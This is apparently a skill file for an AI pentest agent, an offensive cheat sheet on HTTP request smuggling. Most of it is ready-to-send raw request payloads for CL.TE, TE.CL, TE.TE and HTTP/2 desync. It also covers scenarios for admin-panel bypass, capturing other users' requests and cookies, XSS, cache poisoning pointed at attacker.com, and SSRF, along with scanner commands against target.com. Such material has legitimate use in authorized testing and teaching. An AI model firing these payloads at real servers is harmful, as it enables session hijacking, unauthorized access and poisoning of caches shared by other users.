<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: http-smuggling
description: HTTP request smuggling via CL.TE, TE.CL, TE.TE, H2.CL, H2.TE desync attacks
---

# HTTP Request Smuggling

HTTP request smuggling exploits disagreements between front-end (load balancer/CDN) and back-end (application server) about where one HTTP request ends and the next begins. This allows attackers to inject requests that poison back-end queues — bypassing security controls, hijacking sessions, and achieving cache poisoning or RCE escalation.

## Core Concepts

**Why It Works**
- Front-end and back-end use different header precedence for `Content-Length` (CL) and `Transfer-Encoding` (TE)
- RFC 7230: if both headers present, TE takes precedence — but implementations differ
- HTTP/2 uses frame-based framing that can downgrade to HTTP/1.1 with ambiguity

**Attack Types**
| Type | Front-end uses | Back-end uses |
|------|---------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Both support TE (obfuscate to confuse one) | - |
| H2.CL | HTTP/2 (CL header) | HTTP/1.1 (uses CL) |
| H2.TE | HTTP/2 (TE header injected) | HTTP/1.1 (uses TE) |

## CL.TE — Front-end uses CL, Back-end uses TE

Front-end forwards based on Content-Length. Back-end reads chunked Transfer-Encoding, treating remaining data as the start of the next request.

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Detection (timing):**
```
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```
- If hangs ~10s → CL.TE confirmed (back-end waiting for completion of chunk)

**Exploit — Poison next request:**
```
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin HTTP/1.1
Host: vulnerable.com
X-Ignore: X
```

## TE.CL — Front-end uses TE, Back-end uses CL

Front-end reads chunked body fully and forwards. Back-end uses Content-Length, leaving remainder for next request.

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**Detection (timing):**
```
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

1
Z
X
```
- If hangs ~10s → TE.CL confirmed (front-end waits for chunk terminator)

**Exploit — Redirect next victim to attacker URL:**
```
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /redirect HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

0


```

## TE.TE — Both support TE, one can be obfuscated

Both servers support Transfer-Encoding, but one can be made to ignore it via obfuscation:

```bash
# Obfuscation techniques
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
  : chunked
```

**Example TE.TE payload:**
```
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## HTTP/2 Desync (H2.CL and H2.TE)

HTTP/2 uses binary framing (no CL/TE ambiguity), but when downgraded to HTTP/1.1 at the back-end, injected headers create desync.

### H2.CL

```
:method POST
:path /
:authority vulnerable.com
content-type application/x-www-form-urlencoded
content-length 0

GET /admin HTTP/1.1
Host: vulnerable.com
Content-Length: 10

x=1
```

### H2.TE (Request Tunneling)

```
:method POST
:path /
:authority vulnerable.com
transfer-encoding chunked

0

GET /admin HTTP/1.1
Host: internal-backend.com
Content-Length: 5

x=1
```

### H2 Header Injection

```
# Inject \r\n into pseudo-header to add extra HTTP/1.1 headers
:method GET\r\nTransfer-Encoding: chunked
:path /
```

## Detection Tools

```bash
# smuggler.py — automated detection
python3 smuggler.py -u https://target.com -m POST

# h2csmuggler — HTTP/2 cleartext upgrade smuggling
python3 h2csmuggler.py --test https://target.com
python3 h2csmuggler.py --smuggle --header "Transfer-Encoding: chunked" https://target.com /admin

# http-request-smuggling (Burp extension via curl)
# Use Burp Suite HTTP Request Smuggler extension for interactive testing

# Manual timing test
time curl -s -o /dev/null -X POST https://target.com/ \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  --data $'1\r\nZ\r\nQ'
# If 10+ seconds → potential CL.TE
```

## Exploitation Scenarios

### 1. Bypass Front-End Access Controls

```
# Front-end blocks /admin — smuggle past it
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

### 2. Capture Victim Requests (Session Hijacking)

```
# Poison queue with a request that captures the next victim's full request
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 198
Transfer-Encoding: chunked

0

POST /save HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 600

search=
# Next victim's request is appended to the body — retrieve from /save
```

### 3. Reflect Victim Request to XSS

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /404error HTTP/1.1
Host: vulnerable.com
X-Injected: <script>alert(document.cookie)</script>
```

### 4. Web Cache Poisoning via Smuggling

```
# Smuggle a request that poisons cache with malicious response
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 123
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com
```

### 5. Internal Service Access (SSRF via Smuggling)

```
# Reach internal services only accessible via back-end
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 74
Transfer-Encoding: chunked

0

GET http://internal-service.local/admin HTTP/1.1
Host: internal-service.local
```

### 6. Request Queue Poisoning for Account Takeover

```
# Victim's next authenticated request gets processed under attacker's account
# 1. Attacker logs in, gets session A
# 2. Smuggle poisoned request that will intercept next request
# 3. Victim makes any request → processed as attacker's session
```

## HTTP/2 Request Tunneling

Bypasses front-end rules by tunneling a complete HTTP/1 request inside H2:

```python
import httpx

# Full request tunneled inside HTTP/2 body
with httpx.Client(http2=True) as client:
    response = client.post(
        "https://target.com/",
        headers={
            "content-type": "application/x-www-form-urlencoded",
        },
        content=b"GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
    )
```

## Testing Methodology

1. **Detect desync type** — timing-based probes for CL.TE and TE.CL
2. **Confirm with differential response** — compare response of normal vs smuggled request
3. **Identify front-end** — CDN/LB type (Nginx, HAProxy, AWS ALB, Cloudflare) affects behavior
4. **Test H2 downgrade** — check if server accepts HTTP/2, try H2.CL and H2.TE
5. **Exploit access control bypass** — smuggle to /admin or internal paths
6. **Attempt victim capture** — poison queue to capture next request including cookies/tokens
7. **Cache poisoning** — combine with cache poisoning for persistent impact

```bash
# Step 1: Basic timing test for CL.TE
curl -s -o /dev/null -w "%{time_total}" -X POST https://target.com/ \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data $'3\r\nabc\r\nX'
# >10s → CL.TE likely

# Step 2: Confirm with differential response
# Send normal request → note response
# Send smuggled request → if 404/403 different → confirmed

# Step 3: Use smuggler.py
python3 smuggler.py -u https://target.com/ --log-level debug
```

## Indicators of Vulnerability

- Server uses both `Content-Length` and `Transfer-Encoding` headers simultaneously in responses
- Requests are forwarded through a proxy/CDN chain
- Server running: Apache Traffic Server, Varnish, older HAProxy, AWS ALB+EC2 combo
- Inconsistent responses for repeated identical requests
- 400/408 errors on normal requests (back-end confused by smuggled prefix)

## Validation

1. Demonstrate access to `/admin` or other restricted resource via smuggled request
2. Capture a victim's Authorization header via queue poisoning (use Collaborator)
3. Show cache poisoning by contaminating a shared cache entry
4. Provide exact HTTP request bytes (not URL-encoded) for reproduction

## False Positives

- Network timeouts unrelated to chunked encoding handling
- Normal 400 errors on malformed requests
- CDN rate limiting triggering on repeated POST requests

## Impact

- Authentication bypass (access admin panels without credentials)
- Session hijacking (capture live victim authentication tokens)
- Cache poisoning leading to stored XSS or phishing at scale
- SSRF to internal services inaccessible from outside
- Response queue poisoning causing information disclosure

## Pro Tips

1. Always disable automatic `Content-Length` correction in Burp when testing smuggling
2. Use `\r\n` explicitly — tools that normalize line endings break chunked payloads
3. Timing tests are unreliable on high-latency connections — use differential response instead
4. AWS ALB + EC2 is the most common real-world TE.CL configuration
5. Cloudflare's connection reuse makes it vulnerable to H2.TE tunneling
6. Never use `Connection: close` in smuggled requests — breaks the attack chain
7. For victim capture: set `Content-Length` in the smuggled request large enough to capture headers

## Summary

HTTP smuggling exploits parsing disagreements across a proxy chain. CL.TE and TE.CL are the classic HTTP/1.1 variants; H2.CL and H2.TE target HTTP/2-to-HTTP/1.1 downgrade paths. Impact ranges from simple access control bypass to full session hijacking of other users. Use smuggler.py for detection, then manually craft exploits for specific impact.
